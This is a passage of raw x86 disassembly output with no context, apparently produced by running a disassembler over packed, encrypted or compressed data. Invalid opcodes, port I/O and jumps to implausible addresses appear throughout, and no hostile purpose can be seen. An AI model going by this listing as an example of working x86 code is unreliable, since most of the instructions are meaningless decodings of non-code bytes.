  40fc96:	dec    ecx
  40fc97:	dec    esp
  40fc98:	mov    eax,0x500a7c8a
  40fc9d:	pop    es
  40fc9e:	xchg   edx,eax
  40fc9f:	mov    DWORD PTR [ebx],ecx
  40fca1:	push   ebx
  40fca2:	or     ebp,DWORD PTR [esi-0x762fee6a]
  40fca8:	mov    ecx,0xba91c58a
  40fcad:	addr16 cwde 
  40fcaf:	cmp    bl,cl
  40fcb1:	jmp    ebp
  40fcb3:	and    al,0x45
  40fcb5:	(bad)  
  40fcb6:	arpl   WORD PTR [esi],cx
  40fcb8:	dec    esp
  40fcb9:	je     0x40fc44
  40fcbb:	adc    al,0xcb
  40fcbd:	pop    es
  40fcbe:	add    BYTE PTR [eax],al
  40fcc0:	add    BYTE PTR [eax],al
  40fcc2:	add    BYTE PTR [ebp-0x6ffff299],cl
  40fcc8:	pop    ecx
  40fcc9:	inc    edx
  40fcca:	je     0x40fc50
  40fccc:	mov    eax,0x49a2c7f8
  40fcd1:	or     esi,DWORD PTR [eax-0x894d6f]
  40fcd7:	dec    DWORD PTR [eax+0x49470bd3]
  40fcdd:	or     edx,DWORD PTR [esi-0x11]
  40fce0:	mov    ebx,0x915dbf88
  40fce5:	jbe    0x40fd2d
  40fce7:	mov    BYTE PTR [edx-0x7482bb9c],dh
  40fced:	int3   
  40fcee:	ficom  WORD PTR [ecx-0x78451df6]
  40fcf4:	mov    dl,0x37
  40fcf6:	dec    ebx
  40fcf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcf8:	pop    esi
  40fcf9:	aam    0xc3
  40fcfb:	mov    bh,0x2d
  40fcfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcfe:	shl    DWORD PTR [edx],1
  40fd00:	xor    ebx,DWORD PTR [edi-0x3297e4fa]
  40fd06:	fiadd  DWORD PTR [eax-0x4c]
  40fd09:	in     eax,0x80
  40fd0b:	xlat   BYTE PTR ds:[ebx]
  40fd0c:	sbb    DWORD PTR [ebx],edi
  40fd0e:	(bad)  
  40fd0f:	xchg   ebx,eax
  40fd10:	mov    bl,0xe5
  40fd12:	add    esp,ebx
  40fd14:	daa    
  40fd15:	push   edx
  40fd16:	dec    esp
  40fd17:	jl     0x40fcaf
  40fd19:	mov    BYTE PTR [ebp+0x51b4fcc7],dh
  40fd1f:	(bad)  
  40fd22:	icebp  
  40fd23:	pop    edi
  40fd24:	shl    DWORD PTR ds:0x4,0x0
  40fd2b:	add    BYTE PTR ds:0xee0be773,dl
  40fd31:	fistp  DWORD PTR [ecx+0x589845c1]
  40fd37:	dec    ebx
  40fd38:	ret    
  40fd39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd3a:	sbb    al,0x47
  40fd3c:	mov    esp,0xad3cf4c8
  40fd41:	sub    esp,DWORD PTR [ecx-0x3f]
  40fd44:	daa    
  40fd45:	cwde   
  40fd46:	cmp    BYTE PTR [ebx+0x1a],cl
  40fd49:	(bad)  
  40fd4a:	in     eax,dx
  40fd4b:	jle    0x40fd19
  40fd4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd4e:	jp     0x40fcd1
  40fd50:	pop    ds
  40fd51:	cwde   
  40fd52:	adc    BYTE PTR [ebx+0x5f],cl
  40fd55:	xor    esp,DWORD PTR [ebx]
  40fd57:	and    cl,BYTE PTR [edx+esi*4+0x39a5be5]
  40fd5e:	out    0x3,al
  40fd60:	or     eax,0x7f80e073
  40fd65:	xchg   ebp,eax
  40fd66:	push   cs
  40fd67:	neg    BYTE PTR [edx-0x1d]
  40fd6a:	into   
  40fd6b:	mov    gs,WORD PTR [ecx]
  40fd6d:	stc    
  40fd6e:	lds    ebp,FWORD PTR [ebx+0x365c95db]
  40fd74:	dec    edi
  40fd75:	call   0xde0a:0xf594b23b
  40fd7c:	adc    BYTE PTR [ebp+0xe],cl
  40fd7f:	jmp    0x2e600817
  40fd84:	aam    0x95
  40fd86:	lock fcom QWORD PTR [ebx-0x3d]
  40fd8a:	dec    esi
  40fd8b:	jmp    0xa9caa9ac
  40fd90:	add    BYTE PTR [eax],al
  40fd92:	add    BYTE PTR [eax],al
  40fd94:	add    BYTE PTR [edx-0x6c1663cf],bl
  40fd9a:	mov    dl,0x66
  40fd9c:	xor    DWORD PTR [ebp+0x7c03ef95],eax
  40fda2:	xchg   esp,eax
  40fda3:	cmp    ecx,edx
  40fda5:	push   cs
  40fda6:	icebp  
  40fda7:	push   cs
  40fda8:	jle    0x40fe0a
  40fdaa:	sbb    eax,0x2b8c291d
  40fdaf:	inc    edi
  40fdb0:	loope  0x40fdc2
  40fdb2:	push   ebp
  40fdb3:	jp     0x40fd8c
  40fdb5:	and    DWORD PTR [eax],ebp
  40fdb7:	cmp    DWORD PTR [ecx-0x3ef12abb],ecx
  40fdbd:	stos   DWORD PTR es:[edi],eax
  40fdbe:	in     eax,0x4e
  40fdc0:	jmp    0x2030da8f
  40fdc5:	mov    dh,0xe4
  40fdc7:	push   es
  40fdc8:	rcr    DWORD PTR [edi-0x5b16b11b],1
  40fdce:	repnz or ch,BYTE PTR [esi]
  40fdd1:	adc    BYTE PTR [ebp-0x53258d28],0x66
  40fdd8:	test   eax,0x600ed54a
  40fddd:	int3   
  40fdde:	lods   al,BYTE PTR ds:[esi]
  40fddf:	out    dx,eax
  40fde0:	(bad)  
  40fde1:	dec    edx
  40fde2:	jg     0x40fd67
  40fde4:	add    BYTE PTR [esi],bh
  40fde6:	cdq    
  40fde7:	addr16 push eax
  40fde9:	ds jno 0x40fddb
  40fdec:	mov    BYTE PTR [eax],bh
  40fdee:	popf   
  40fdef:	lock aaa 
  40fdf1:	out    dx,al
  40fdf2:	loope  0x40fd78
  40fdf4:	dec    edi
  40fdf5:	loope  0x40fe41
  40fdf7:	xchg   BYTE PTR [ecx+0x0],al
  40fdfa:	add    BYTE PTR [eax],al
  40fdfc:	add    BYTE PTR [eax],al
  40fdfe:	leave  
  40fdff:	adc    eax,0x49a00841
  40fe04:	or     esi,DWORD PTR [ebx+eax*8-0x59]
  40fe08:	push   ebp
  40fe09:	or     BYTE PTR [ebp-0x7b],dh
  40fe0c:	ss pop ecx
  40fe0e:	mov    ebp,0x8038ff64
  40fe13:	sahf   
  40fe14:	jnp    0x40fe21
  40fe16:	div    BYTE PTR [edx+0xb]
  40fe19:	add    DWORD PTR [ecx+0x78b00eb0],ebp
  40fe1f:	neg    DWORD PTR [ebx]
  40fe21:	call   0x4f4acc
  40fe26:	lock dec ecx
  40fe28:	pop    es
  40fe29:	push   DWORD PTR [esi]
  40fe2b:	jmp    0x40fe47
  40fe2d:	mov    esp,0x88ef704b
  40fe32:	ds mov esi,0xed825fce
  40fe38:	pop    ecx
  40fe39:	mov    edi,DWORD PTR [eax+0x41468461]
  40fe3f:	xchg   ebp,eax
  40fe40:	sub    DWORD PTR [ecx+edi*1],eax
  40fe43:	mov    al,0x5e
  40fe45:	mov    edi,0xeb135
  40fe4a:	push   ss
  40fe4b:	jmp    0x40fe67
  40fe4d:	dec    eax
  40fe4e:	dec    ebx
  40fe4f:	jo     0x40fe40
  40fe51:	test   BYTE PTR [ecx+0x63],bh
  40fe54:	or     BYTE PTR [edx],dh
  40fe56:	imul   esi,edi,0xb02900f6
  40fe5c:	or     DWORD PTR [esi+0x1],0xffffffeb
  40fe60:	jnp    0x40fe86
  40fe62:	add    BYTE PTR [eax],al
  40fe64:	add    BYTE PTR [eax],al
  40fe66:	add    BYTE PTR [eax-0x613f7373],dl
  40fe6c:	xchg   DWORD PTR [ebx],ecx
  40fe6e:	add    BYTE PTR [ebx],cl
  40fe70:	mov    ch,0x52
  40fe72:	cmp    al,0x40
  40fe74:	xchg   DWORD PTR [ebx],ecx
  40fe76:	test   eax,edx
  40fe78:	push   ss
  40fe79:	ins    DWORD PTR es:[edi],dx
  40fe7a:	mov    dl,BYTE PTR [esi-0x6f]
  40fe7d:	test   dh,bh
  40fe7f:	xlat   BYTE PTR ds:[ebx]
  40fe80:	mov    esi,es
  40fe82:	mov    BYTE PTR [eax],bl
  40fe84:	mov    edx,0x1090000c
  40fe89:	into   
  40fe8a:	pop    es
  40fe8b:	arpl   WORD PTR [edx],dx
  40fe8d:	je     0x40fec2
  40fe8f:	mov    cs,WORD PTR [ecx-0x5ea974f5]
  40fe95:	sbb    bl,bl
  40fe97:	sbb    DWORD PTR [edx],eax
  40fe99:	add    al,0x6
  40fe9b:	nop
  40fe9c:	mov    DWORD PTR [edx+0x45],esi
  40fe9f:	mov    BYTE PTR [eax+0x34],bh
  40fea2:	mov    BYTE PTR [eax],ch
  40fea4:	jne    0x40feb3
  40fea6:	add    BYTE PTR [eax-0x17f831f0],dl
  40feac:	(bad)  
  40fead:	mov    dh,0x3f
  40feaf:	nop
  40feb0:	and    ah,BYTE PTR [edi+edi*1-0x6a]
  40feb4:	mov    DWORD PTR [ebx],ecx
  40feb6:	mov    ecx,esi
  40feb8:	xchg   ecx,eax
  40feb9:	dec    esi
  40feba:	jg     0x40fe90
  40febc:	mov    ecx,DWORD PTR [ebx]
  40febe:	add    BYTE PTR [ecx+0x1b000b89],dl
  40fec4:	dec    ebx
  40fec5:	xrelease mov BYTE PTR [eax],ch
  40fec8:	push   ecx
  40fec9:	or     eax,0x0
  40fece:	add    BYTE PTR [eax],al
  40fed0:	nop
  40fed1:	adc    dh,cl
  40fed3:	pop    es
  40fed4:	scas   al,BYTE PTR es:[edi]
  40fed5:	and    dh,BYTE PTR [edi+ecx*2-0x6a]
  40fed9:	mov    DWORD PTR [ebx],ecx
  40fedb:	mov    ecx,esi
  40fedd:	xchg   ecx,eax
  40fede:	jae    0x40fe77
  40fee0:	ret    0xb8b
  40fee3:	add    BYTE PTR [ebx],cl
  40fee5:	mov    dl,0x9f
  40fee7:	sti    
  40fee8:	xchg   esp,eax
  40fee9:	add    cl,ch
  40feeb:	add    edx,DWORD PTR [eax-0x3411e6fe]
  40fef1:	mov    edi,0xec0b03a5
  40fef6:	std    
  40fef7:	fst    QWORD PTR [edx-0x584701f6]
  40fefd:	mov    dl,0xe2
  40feff:	mov    ch,0x97
  40ff01:	mov    dl,0xe5
  40ff03:	mov    bl,0xd6
  40ff05:	mov    esp,0xb28ff2ad
  40ff0a:	jl     0x40fec2
  40ff0c:	(bad)  
  40ff0d:	cld    
  40ff0e:	push   0xffffff85
  40ff10:	outs   dx,DWORD PTR ds:[esi]
  40ff11:	lods   al,BYTE PTR ds:[esi]
  40ff12:	in     eax,0x3
  40ff14:	pusha  
  40ff15:	or     dl,BYTE PTR [esi]
  40ff17:	bound  ebp,QWORD PTR [edi-0x4e]
  40ff1a:	pop    ebp
  40ff1b:	in     eax,dx
  40ff1c:	mov    cl,0xf1
  40ff1e:	in     eax,0xdb
  40ff20:	xchg   edx,eax
  40ff21:	nop
  40ff22:	and    eax,0x869c2804
  40ff27:	les    ecx,FWORD PTR [edi-0x389a79e6]
  40ff2d:	mov    dl,0xd
  40ff2f:	cmp    dh,BYTE PTR [eax-0xd]
  40ff32:	in     eax,0xdb
  40ff34:	add    BYTE PTR [eax],al
  40ff36:	add    BYTE PTR [eax],al
  40ff38:	add    BYTE PTR [esp+edx*4],cl
  40ff3b:	and    eax,0x8f57f804
  40ff40:	les    esp,FWORD PTR [edi+0x1a]
  40ff43:	pop    edx
  40ff44:	es lahf 
  40ff46:	mov    dl,0x52
  40ff48:	mov    esi,0x63151a8b
  40ff4d:	(bad)  
  40ff4e:	mov    dl,0xb5
  40ff50:	inc    esi
  40ff51:	loopne 0x40ff09
  40ff53:	ins    BYTE PTR es:[edi],dx
  40ff54:	mov    dh,0x97
  40ff56:	xor    eax,0xb4091029
  40ff5b:	jl     0x40ff13
  40ff5d:	xchg   edi,eax
  40ff5e:	lds    esp,FWORD PTR ds:0xeed890d
  40ff64:	out    0xa0,al
  40ff66:	push   ecx
  40ff67:	dec    edi
  40ff68:	(bad)  
  40ff69:	sar    DWORD PTR [ecx-0x7d7540f2],1
  40ff6f:	and    DWORD PTR [edi-0x158505f9],0x3b
  40ff76:	pop    es
  40ff77:	sbb    esp,DWORD PTR [edx+0x36]
  40ff7a:	mov    edx,0x693c18b
  40ff7f:	add    edi,esi
  40ff81:	adc    DWORD PTR [ecx-0x8a526a2],0x6
  40ff88:	nop
  40ff89:	adc    dh,BYTE PTR [edx+0x3453470e]
  40ff8f:	loop   0x40ff7e
  40ff91:	add    ah,bh
  40ff93:	pop    eax
  40ff94:	ds push edi
  40ff96:	add    eax,0x9a3b052b
  40ff9b:	out    dx,eax
  40ff9c:	fadd   QWORD PTR [eax]
  40ff9e:	add    BYTE PTR [eax],al
  40ffa0:	add    BYTE PTR [eax],al
  40ffa2:	ret    
  40ffa3:	mov    ds:0x892ae94e,eax
  40ffa8:	cmp    edx,DWORD PTR [edx+0x62f00018]
  40ffae:	inc    edx
  40ffaf:	cmp    bh,BYTE PTR [edx-0x33]
  40ffb2:	cmp    DWORD PTR [edx],0x52
  40ffb5:	lds    edi,FWORD PTR [ebx+0x32]
  40ffb8:	cmc    
  40ffb9:	xchg   edi,eax
  40ffba:	xchg   ebx,eax
  40ffbb:	mov    dl,0xe
  40ffbd:	fdivrp st(6),st
  40ffbf:	inc    eax
  40ffc0:	push   cs
  40ffc1:	jmp    0xf1823d59
  40ffc6:	into   
  40ffc7:	add    eax,0x7212c92b
  40ffcc:	sbb    BYTE PTR [ebx],dh
  40ffce:	push   edi
  40ffcf:	mov    dl,0xe
  40ffd1:	jmp    0xeb819ec1
  40ffd6:	xchg   ebx,eax
  40ffd7:	aaa    
  40ffd8:	into   
  40ffd9:	fmul   QWORD PTR [esi-0x18]
  40ffdc:	out    dx,eax
  40ffdd:	aad    0x97
  40ffdf:	fiadd  DWORD PTR [ecx+0x16b0e500]
  40ffe5:	call   0x30fdfe
  40ffea:	mov    dl,0x81
  40ffec:	sub    edx,DWORD PTR [eax]
  40ffee:	lods   eax,DWORD PTR ds:[esi]
  40ffef:	cmc    
  40fff0:	jnp    0x410053
  40fff2:	js     0x41006d
  40fff4:	sub    ebx,DWORD PTR [eax]
  40fff6:	stc    
  40fff7:	mov    ch,0xe
  40fff9:	add    BYTE PTR ds:0xcd5484a0,ah
  40ffff:	mov    al,0x5b
  410001:	push   edi
  410002:	sub    cl,dh
  410004:	out    0xd9,eax
  410006:	add    BYTE PTR [eax],al
  410008:	add    BYTE PTR [eax],al
  41000a:	add    cl,ah
  41000c:	mov    ah,0xe
  41000e:	mov    esi,DWORD PTR [ecx*4+0x5e71f884]
  410015:	sbb    ebp,ebx
  410017:	ror    BYTE PTR [ecx],0x4b
  41001a:	or     BYTE PTR [edx-0x8],al
  41001d:	leave  
  41001e:	inc    eax
  41001f:	mov    ebp,0x5dff89b3
  410024:	scas   al,BYTE PTR es:[edi]
  410025:	add    DWORD PTR [ebp-0x5f],0x6a
  410029:	push   cs
  41002a:	push   0x30119f
  41002f:	push   ecx
  410030:	mov    ds:0x6ca940eb,eax
  410035:	and    bl,ah
  410037:	mov    ecx,0xa1575bb6
  41003c:	mov    al,BYTE PTR [eax+0x40]
  41003f:	imul   esi,edi,0x8eb9ff1f
  410045:	mov    esp,es
  410047:	pop    ecx
  410048:	adc    DWORD PTR [eax+0x34f1bc0f],esi
  41004e:	(bad)  
  41004f:	pop    ebp
  410050:	pop    DWORD PTR [edi+ecx*8+0x18f9511]
  410057:	cmp    DWORD PTR [ebx],ecx
  410059:	ret    0x52e8
  41005c:	push   esp
  41005d:	push   cs
  41005e:	add    BYTE PTR [eax+0xa5ca948],dl
  410064:	frstor [ebp+0x4d865482]
  41006a:	pop    es
  41006b:	nop
  41006c:	es jbe 0x41005a
  41006f:	add    BYTE PTR [eax],al
  410071:	add    BYTE PTR [eax],al
  410073:	add    BYTE PTR [ebx],cl
  410075:	pop    edi
  410076:	test   DWORD PTR [edx-0x14736e43],0xb9b98
  410080:	adc    ebx,edx
  410082:	push   ss
  410083:	push   esi
  410084:	or     ebp,DWORD PTR [ebx-0x5dfa7346]
  41008a:	inc    edi
  41008b:	(bad)  
  41008c:	out    dx,eax
  41008d:	mov    eax,ds:0x99904de2
  410092:	jo     0x410053
  410094:	fs push 0xee844576
  41009a:	ja     0x410093
  41009c:	int    0x98
  41009e:	dec    edx
  41009f:	mov    WORD PTR [edx+ebx*8+0x14d18aba],cs
  4100a6:	mov    edx,0x5c716003
  4100ab:	std    
  4100ac:	scas   eax,DWORD PTR es:[edi]
  4100ad:	js     0x41011e
  4100af:	mov    edi,0x454a9c1c
  4100b4:	mov    BYTE PTR [ebx+ecx*2-0xca436a3],cl
  4100bb:	inc    edx
  4100bd:	pop    ecx
  4100be:	retf   
  4100bf:	rcl    DWORD PTR [ecx+ebx*4+0x1c6c8aa0],0x58
  4100c7:	das    
  4100c8:	jecxz  0x410091
  4100ca:	mov    eax,ds:0xf6a34b32
  4100cf:	mov    ebp,cs
  4100d1:	sub    eax,0x30b4fbe
  4100d6:	ja     0x4100c8
  4100d8:	add    BYTE PTR [eax],al
  4100da:	add    BYTE PTR [eax],al
  4100dc:	add    BYTE PTR [ecx],cl
  4100de:	mov    esi,0xb2ed883a
  4100e3:	xor    DWORD PTR [edx-0x1c],edi
  4100e6:	push   0x50
  4100e8:	out    dx,al
  4100e9:	fild   QWORD PTR [eax+0x761303a5]
  4100ef:	shl    DWORD PTR [esi-0x24],1
  4100f2:	bound  edi,QWORD PTR [esi-0x5a]
  4100f5:	das    
  4100f6:	call   0x4361:0x8f1e479c
  4100fd:	mov    ds:0x1cac9704,eax
  410102:	std    
  410103:	xor    eax,0x108d5f5b
  410108:	inc    esp
  410109:	adc    esi,DWORD PTR [edx-0x6f]
  41010c:	fisttp WORD PTR [edx]
  41010e:	adc    dl,ch
  410110:	jbe    0x410166
  410112:	bound  edx,QWORD PTR [eax-0x6e61b3c4]
  410118:	mov    ah,0x9f
  41011a:	mov    dl,0x6e
  41011c:	mov    esi,0x4f8238e7
  410121:	into   
  410122:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410123:	push   ebp
  410124:	push   ss
  410125:	push   eax
  410126:	mov    dl,0x7e
  410128:	leave  
  410129:	(bad)  
  41012a:	xor    al,0xa5
  41012c:	mov    eax,0xc065188b
  410131:	push   esi
  410132:	nop
  410133:	sub    DWORD PTR [eax-0x36810d6d],edi
  410139:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41013a:	mov    gs,WORD PTR [edi]
  41013c:	or     BYTE PTR ds:0x8fb1f5,al
  410142:	add    BYTE PTR [eax],al
  410144:	add    BYTE PTR [eax],al
  410146:	pop    ebp
  410147:	cmp    al,0xdf
  410149:	sub    esi,eax
  41014b:	fucom  st(6)
  41014d:	add    edi,DWORD PTR [ecx-0x64456e11]
  410153:	cmp    DWORD PTR [edx],ebp
  410155:	pop    esp
  410156:	test   ecx,0x1667c484
  41015c:	shl    DWORD PTR [esi],0x9f
  41015f:	mov    dl,0xe
  410161:	sbb    dl,bl
  410163:	fucomp st(7)
  410165:	sbb    DWORD PTR [eax+0x18f9ca31],esp
  41016b:	dec    esi
  41016c:	jp     0x410159
  41016e:	(bad)  
  41016f:	mov    dl,0xc7
  410171:	lods   al,BYTE PTR ds:[esi]
  410172:	sbb    DWORD PTR [bx+si-0x57],eax
  410176:	xchg   ebx,eax
  410177:	aas    
  410178:	inc    ecx
  410179:	sbb    DWORD PTR [ebx+edi*4-0x10],esi
  41017d:	sar    DWORD PTR ds:[eax],cl
  410180:	dec    ecx
  410181:	sbb    eax,0xa10c0244
  410186:	dec    eax
  410187:	mov    dh,0x83
  410189:	mov    ah,0x6b
  41018b:	xchg   ebp,eax
  41018c:	xor    bh,BYTE PTR [esi-0x6b]
  41018f:	mov    dl,0x8b
  410191:	xchg   esp,eax
  410192:	arpl   WORD PTR [ebp+0x652e07b],cx
  410198:	fild   WORD PTR [esi]
  41019a:	mov    DWORD PTR [esi+0x1c],ecx
  41019d:	test   eax,0x6350ed93
  4101a2:	dec    edi
  4101a3:	call   0xb2d92d6d
  4101a8:	pop    ecx
  4101a9:	jb     0x4101ab
  4101ab:	add    BYTE PTR [eax],al
  4101ad:	add    BYTE PTR [eax],al
  4101af:	ja     0x4101e1
  4101b1:	jmp    0x4388:0x2a9a16e1
  4101b8:	sbb    BYTE PTR [ebx-0x17],cl
  4101bb:	(bad)  
  4101bc:	out    0x57,eax
  4101be:	jo     0x41018f
  4101c0:	rcr    DWORD PTR [esi],1
  4101c2:	ror    DWORD PTR [edx-0x1c],1
  4101c5:	or     eax,0x130706e9
  4101ca:	arpl   bx,bp
  4101cc:	xor    ebx,edx
  4101ce:	sbb    eax,0xc54a3e45
  4101d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101d4:	loop   0x41023a
  4101d6:	icebp  
  4101d7:	and    cl,dh
  4101d9:	sub    cl,cl
  4101db:	inc    ebx
  4101dc:	sbb    ecx,DWORD PTR [edi]
  4101de:	add    BYTE PTR [esi],cl
  4101e0:	dec    edx
  4101e1:	sbb    edi,edi
  4101e3:	inc    esp
  4101e4:	and    eax,0x3a694019
  4101e9:	scas   eax,DWORD PTR es:[edi]
  4101ea:	js     0x41018b
  4101ec:	xor    eax,0xb68d2473
  4101f1:	jp     0x41024a
  4101f3:	ret    0x2b7d
  4101f6:	sub    BYTE PTR [esi+edi*8-0x672ef285],ah
  4101fd:	add    bh,BYTE PTR ds:[ecx]
  410200:	cmp    ch,BYTE PTR [edi+0x433bf775]
  410206:	and    al,0x91
  410208:	(bad)  
  41020a:	clc    
  41020b:	clc    
  41020c:	mov    al,0x83
  41020e:	clc    
  41020f:	je     0x410201
  410211:	jnp    0x41024a
  410213:	add    BYTE PTR [eax],al
  410215:	add    BYTE PTR [eax],al
  410217:	add    BYTE PTR [edx-0x1695e49e],al
  41021d:	cmp    ebx,eax
  41021f:	call   0x4fd069
  410224:	je     0x410217
  410226:	jnp    0x410248
  410228:	ret    0x72b9
  41022b:	ins    BYTE PTR es:[edi],dx
  41022c:	and    eax,0x906709b1
  410231:	ja     0x410222
  410233:	cmc    
  410234:	mov    ah,0x58
  410236:	arpl   WORD PTR [ecx+ebp*4-0x60],ax
  41023a:	jp     0x410242
  41023c:	call   0x85b0:0xb9009f38
  410243:	xchg   BYTE PTR [ecx],ch
  410245:	mov    dh,0xe
  410247:	add    BYTE PTR [esi-0x449fe50d],al
  41024d:	jo     0x41023e
  41024f:	inc    ah
  410251:	call   0x75f0:0x6a5975f0
  410258:	xchg   ecx,eax
  410259:	icebp  
  41025a:	jp     0x410270
  41025c:	nop
  41025d:	and    al,0xb7
  41025f:	movq   mm4,QWORD PTR [edi-0x7e2200e2]
  410266:	dec    esi
  410267:	push   ebx
  410268:	mov    ah,0x49
  41026a:	sub    bh,0xc
  41026d:	and    DWORD PTR [esi-0x2a0bc7fc],esi
  410273:	add    BYTE PTR [eax-0x213a7d8c],dl
  410279:	jo     0x4101fd
  41027b:	in     al,0x0
  41027d:	add    BYTE PTR [eax],al
  41027f:	add    BYTE PTR [eax],al
  410281:	aad    0xd7
  410283:	jmp    0x9001:0x52ce10ff
  41028a:	cdq    
  41028b:	ficom  DWORD PTR [esi+eax*8+0x24]
  41028f:	cmp    BYTE PTR [eax+ebp*8],0x70
  410293:	(bad)  
  410294:	push   edi
  410296:	cdq    
  410297:	(bad)  
  410298:	add    BYTE PTR [eax-0x5bdc892c],dl
  41029e:	cwde   
  41029f:	or     eax,DWORD PTR [eax]
  4102a1:	or     BYTE PTR [esi-0x19],bl
  4102a4:	push   ss
  4102a5:	out    dx,eax
  4102a6:	in     eax,0xe6
  4102a8:	adc    edx,DWORD PTR [ebx+0x24ff0b99]
  4102ae:	jbe    0x4102c7
  4102b0:	add    edx,DWORD PTR [eax+0x74b34e99]
  4102b6:	or     al,BYTE PTR gs:[eax]
  4102b9:	nop
  4102ba:	xchg   esp,eax
  4102bb:	ja     0x4102e0
  4102bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102be:	cwde   
  4102bf:	or     eax,DWORD PTR [eax]
  4102c1:	mov    bh,0x2d
  4102c3:	out    0x13,eax
  4102c5:	xchg   ebx,eax
  4102c6:	cdq    
  4102c7:	or     edi,edi
  4102c9:	fdivr  QWORD PTR [ebp-0x666ffcea]
  4102cf:	dec    esi
  4102d0:	mov    bl,0x6c
  4102d2:	ins    DWORD PTR es:[edi],dx
  4102d3:	or     al,BYTE PTR [eax]
  4102d5:	nop
  4102d6:	pop    esp
  4102d7:	ja     0x4102fc
  4102d9:	pushf  
  4102da:	mov    dl,0xe4
  4102dc:	add    edx,DWORD PTR [eax+0xc10a536]
  4102e2:	test   ebp,esp
  4102e4:	add    eax,DWORD PTR [eax]
  4102e6:	add    BYTE PTR [eax],al
  4102e8:	add    BYTE PTR [eax],al
  4102ea:	nop
  4102eb:	aaa    
  4102ec:	popa   
  4102ed:	out    0x83,eax
  4102ef:	scas   eax,DWORD PTR es:[edi]
  4102f0:	in     eax,0x3
  4102f2:	or     eax,DWORD PTR [esi-0x37]
  4102f5:	adc    edx,DWORD PTR [ebx-0x1a2b1a4e]
  4102fb:	mov    ebx,DWORD PTR [eax+0x5a352f8c]
  410301:	adc    BYTE PTR [eax],cl
  410303:	xchg   edi,eax
  410304:	in     eax,0x3
  410306:	nop
  410307:	test   BYTE PTR [ecx-0x19],ah
  41030a:	xchg   edi,eax
  41030b:	scas   eax,DWORD PTR es:[edi]
  41030c:	in     eax,0x3
  41030e:	xchg   ecx,eax
  41030f:	mov    ebx,0x8b1f5e61
  410314:	in     eax,0x86
  410316:	sbb    eax,0xf5661bb
  41031b:	mov    esp,ebp
  41031d:	xchg   dl,ch
  41031f:	mov    edx,0x8aff4e61
  410324:	in     eax,0x40
  410326:	mov    ebp,0x815ff28b
  41032b:	repnz in eax,0x86
  41032e:	daa    
  41032f:	mov    ebx,0x8adf7e61
  410334:	in     eax,0x8c
  410336:	iret   
  410337:	cdq    
  410338:	xor    al,0x38
  41033a:	nop
  41033b:	mov    dl,0x6e
  41033d:	(bad)  
  41033e:	jae    0x4102ea
  410340:	bound  eax,QWORD PTR [esi+ecx*4+0x36]
  410344:	fwait
  410345:	add    al,0x90
  410347:	mov    dl,0x6c
  410349:	push   cs
  41034a:	cmp    dh,BYTE PTR [edx+0x546c]
  410350:	add    BYTE PTR [eax],al
  410352:	add    BYTE PTR [edi-0x6ffa32e0],ch
  410358:	cmp    DWORD PTR [ecx],ebp
  41035a:	call   0xa94f38e2
  41035f:	dec    eax
  410360:	or     eax,DWORD PTR [ecx+esi*4+0x1572c77b]
  410367:	dec    eax
  410368:	mov    al,BYTE PTR [edx+0x5eae6825]
  41036e:	xchg   esi,eax
  41036f:	arpl   WORD PTR [ebx],si
  410371:	mov    DWORD PTR [esi],0xae0ef3b5
  410377:	dec    eax
  410378:	(bad)  
  410379:	sub    ch,dl
  41037b:	xchg   ebx,eax
  41037c:	mov    bl,0xe
  41037e:	jbe    0x410329
  410380:	bound  ebx,QWORD PTR [ecx+ebp*1]
  410383:	mov    WORD PTR [edi],gs
  410385:	into   
  410386:	fnstsw WORD PTR [esi]
  410388:	cmp    eax,0x89d8058a
  41038d:	out    dx,eax
  41038e:	jmp    0xc2efb2bd
  410393:	dec    edi
  410394:	mov    bh,BYTE PTR [edx-0x7]
  410397:	gs scas al,BYTE PTR es:[edi]
  410399:	data16 int 0x4f
  41039c:	mov    bh,bh
  41039e:	mov    esp,0x5b2c596
  4103a3:	pusha  
  4103a4:	mov    edi,ebp
  4103a6:	jmp    0xfd6bf9cb
  4103ab:	jecxz  0x410335
  4103ad:	cmp    esp,DWORD PTR [eax+0x10]
  4103b0:	(bad)  
  4103b1:	fucompp 
  4103b3:	xchg   ebx,eax
  4103b4:	mov    dl,0xc7
  4103b6:	lods   eax,DWORD PTR ds:[esi]
  4103b7:	add    BYTE PTR [eax],al
  4103b9:	add    BYTE PTR [eax],al
  4103bb:	add    bh,dh
  4103bd:	aad    0xc
  4103bf:	jmp    0xdd30b650
  4103c4:	addr16 mov ds:0xe94e,eax
  4103c8:	sbb    BYTE PTR [edx+0x79],cl
  4103cb:	cli    
  4103cc:	jmp    0x410357
  4103ce:	outs   dx,DWORD PTR ds:[esi]
  4103cf:	jmp    0xd6502067
  4103d4:	out    0xd5,eax
  4103d6:	adc    cl,dh
  4103d8:	popf   
  4103d9:	mov    BYTE PTR [ecx],bl
  4103db:	add    cl,dh
  4103dd:	mov    ds:0x41d6004e,eax
  4103e2:	sub    ebx,DWORD PTR [eax]
  4103e4:	inc    esi
  4103e5:	stos   BYTE PTR es:[edi],al
  4103e6:	outs   dx,BYTE PTR ds:[esi]
  4103e7:	adc    bh,BYTE PTR [ecx+0x3612e3ae]
  4103ed:	add    DWORD PTR [esp+edx*1],ebp
  4103f0:	push   0xffffffb5
  4103f2:	push   cs
  4103f3:	dec    ebp
  4103f5:	xchg   ecx,eax
  4103f6:	sbb    eax,DWORD PTR [ebx]
  4103f8:	jns    0x4103af
  4103fa:	out    dx,eax
  4103fb:	xlat   BYTE PTR ds:[ebx]
  4103fc:	loop   0x4103db
  4103fe:	outs   dx,DWORD PTR ds:[esi]
  4103ff:	jl     0x41044e
  410401:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410402:	push   cs
  410403:	je     0x410441
  410405:	frstor [edi]
  410407:	push   esi
  410408:	cmp    BYTE PTR [ebp-0x53da1b1],dh
  41040e:	push   edx
  41040f:	pop    ebx
  410410:	test   al,0xf1
  410412:	xlat   BYTE PTR ds:[ebx]
  410413:	add    bh,BYTE PTR [ecx]
  410415:	mov    ch,0xcc
  410417:	sub    al,0x39
  410419:	cs jecxz 0x41042c
  41041c:	sub    esi,DWORD PTR [ebp+0x530e]
